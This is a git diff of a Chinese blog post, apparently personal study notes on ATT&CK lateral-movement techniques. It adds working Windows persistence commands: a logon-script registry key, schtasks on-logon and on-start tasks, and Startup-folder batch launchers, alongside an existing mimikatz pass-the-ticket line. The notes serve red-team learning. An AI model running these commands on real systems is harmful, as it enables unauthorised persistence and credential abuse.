@@ -5,15 +5,33 @@ excerpt: "跟着ATT&CK学安全之lateral-movement"
 categories: [ATT&CK]
 comments: true
 ---
-#### Application Deployment Software
-攻击者可以通过企业管理员账号进行软件下发,来进行横向移动
-#### T1037 - Logon Scripts
+### Application Deployment Software
+攻击者可以通过企业管理员账号进行软件下发,来进行横向移动,或者persistence
+
+这个没法复现
+### T1037 - Logon Scripts
 通过修改远程的Logon Scripts脚本来进行横向移动
-##### 测试1 使用调度系统添加Logon自启动
+###### 测试1 Logon Scripts
+```
+echo cmd /c "#{script_command}" > #{script_path}
+REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+```
+win10成功复现
+###### 测试2 使用调度系统添加Logon自启动
 ```
 schtasks /create /tn "T1037_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
 schtasks /create /tn "T1037_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
 ```
+win10成功复现
+###### 测试3 Supicious bat file run from startup Folder
+就是把文件放在了startup文件夹中
+```
+Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
+Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
+```
+win10成功复现
 #### T1075 - Pass the Hash
 这项技术不需要红队获得密码明文,这个技术绕过了标准的权限认证步骤,直接到hash验证的部分,win7或者高于KB2871997需要域名用户凭证,或者RID 500 administrator hash
 ###### 测试 
@@ -37,7 +55,7 @@ mimikatz # kerberos::ptt #{user_name}@#{domain}
 ```
 更多内容见:https://blog.csdn.net/citelao/article/details/50947685
 ### T1077 - Windows Admin Shares
-windows系统又一个隐藏的网络分享,它只在administrator用户可见,并且提供了远程文件复制等功能.红队可以使用这个技术结合administrator等级的账号使用SMB协议进行远程控制.
+windows系统有一个隐藏的网络分享,它只在administrator用户可见,并且提供了远程文件复制等功能.红队可以使用这个技术结合administrator等级的账号使用SMB协议进行远程控制.
 
 **之后再补充**
 ### T1076 - Remote Desktop Protocol
